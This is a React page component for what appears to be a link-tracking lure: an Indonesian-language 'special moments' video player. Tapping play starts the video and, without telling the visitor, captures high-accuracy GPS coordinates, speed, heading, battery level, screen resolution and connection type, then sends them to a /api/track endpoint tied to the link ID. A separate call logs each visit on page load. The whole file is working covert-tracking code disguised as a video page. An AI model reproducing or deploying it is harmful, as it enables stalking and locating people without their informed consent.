'use client';

import { useState, useEffect, useRef, use } from 'react';

export default function TargetVideoViewPage({ params }) {
  const unwrappedParams = use(params);
  const linkId = unwrappedParams.id;

  const [linkConfig, setLinkConfig] = useState(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef(null);

  // 1. Notify server of page visit on mount & fetch link metadata
  useEffect(() => {
    if (!linkId) return;

    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});

    fetch(`/api/links/${linkId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.link) {
          setLinkConfig(data.link);
        }
      })
      .catch((err) => console.warn('Fetch link error:', err));
  }, [linkId]);

  // Battery helper
  const getBattery = async () => {
    try {
      if (typeof navigator !== 'undefined' && typeof navigator.getBattery === 'function') {
        const b = await navigator.getBattery();
        const level = Math.round((b.level || 0) * 100);
        const charging = b.charging ? ' (⚡ Mengisi)' : '';
        return `${level}%${charging}`;
      }
    } catch (e) {}
    return null;
  };

  // Play button click: Start video synchronously (iOS/Safari compliance) & get location concurrently
  const handlePlayVideo = () => {
    setIsLoading(true);
    setIsPlaying(true);

    // 1. Direct synchronous play trigger for iOS Safari & Android
    if (videoRef.current) {
      videoRef.current.play().catch((e) => {
        console.warn('Playback notice:', e);
      });
    }

    // 2. Concurrently read Geolocation in background and send to backend
    if (typeof window !== 'undefined' && navigator.geolocation) {
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';

      getBattery().then((battery) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;

            fetch(`/api/track/${linkId || 'direct'}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude,
                longitude,
                accuracy,
                altitude,
                altitudeAccuracy,
                heading,
                speed,
                screenResolution,
                battery,
                connectionType
              })
            }).catch(() => {});
          },
          (err) => {
            console.warn('Geolocation error:', err);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });
    }

    setIsLoading(false);
  };

  const videoSource = linkConfig?.videoUrl || '/videos/momenvideo.mp4';
  const videoTitle = linkConfig?.title || 'Video Dokumentasi & Momen Spesial';

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#0a0d14',
      color: '#f8fafc',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      padding: '20px 16px 40px 16px'
    }}>
      
      <div style={{ maxWidth: '840px', margin: '0 auto' }}>

        {/* Video Player Container */}
        <div style={{
          position: 'relative',
          width: '100%',
          aspectRatio: '16 / 9',
          backgroundColor: '#000000',
          borderRadius: '16px',
          overflow: 'hidden',
          boxShadow: '0 20px 50px -10px rgba(0, 0, 0, 0.8), 0 0 30px rgba(239, 68, 68, 0.1)',
          border: '1px solid rgba(255, 255, 255, 0.1)'
        }}>

          {/* HTML5 Video element */}
          <video
            ref={videoRef}
            src={videoSource}
            playsInline
            webkit-playsinline="true"
            controls={isPlaying}
            loop
            preload="auto"
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'contain',
              backgroundColor: '#000',
              display: 'block'
            }}
          />

          {/* Player Overlay Before Playing */}
          {!isPlaying && (
            <div
              onClick={handlePlayVideo}
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                background: 'linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.75))',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                userSelect: 'none',
                zIndex: 10
              }}
            >
              {/* Central Play Button */}
              <div style={{ position: 'relative', marginBottom: '14px' }}>
                <div style={{
                  width: '80px',
                  height: '80px',
                  borderRadius: '50%',
                  background: 'rgba(239, 68, 68, 0.95)',
                  boxShadow: '0 0 35px rgba(239, 68, 68, 0.7), 0 0 0 8px rgba(239, 68, 68, 0.25)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: 'white',
                  fontSize: '32px',
                  paddingLeft: '5px'
                }}>
                  {isLoading ? (
                    <div style={{
                      width: '28px',
                      height: '28px',
                      border: '3px solid rgba(255,255,255,0.3)',
                      borderRadius: '50%',
                      borderTopColor: '#ffffff',
                      animation: 'spin 0.8s linear infinite'
                    }} />
                  ) : (
                    '▶'
                  )}
                </div>
              </div>

              <div style={{
                fontSize: '1.05rem',
                fontWeight: 600,
                color: '#ffffff',
                textShadow: '0 2px 8px rgba(0,0,0,0.8)'
              }}>
                Ketuk untuk Putar Video
              </div>

              {/* Progress Line */}
              <div style={{
                position: 'absolute',
                bottom: 0,
                left: 0,
                width: '100%',
                height: '4px',
                background: 'rgba(255,255,255,0.2)'
              }}>
                <div style={{ width: '0%', height: '100%', background: '#ef4444' }} />
              </div>

            </div>
          )}

        </div>

        {/* Video Title only */}
        <div style={{ marginTop: '16px' }}>
          <h1 style={{
            fontSize: '1.25rem',
            fontWeight: 700,
            lineHeight: 1.4,
            margin: 0,
            color: '#f8fafc'
          }}>
            {videoTitle}
          </h1>
        </div>

      </div>

    </div>
  );
}
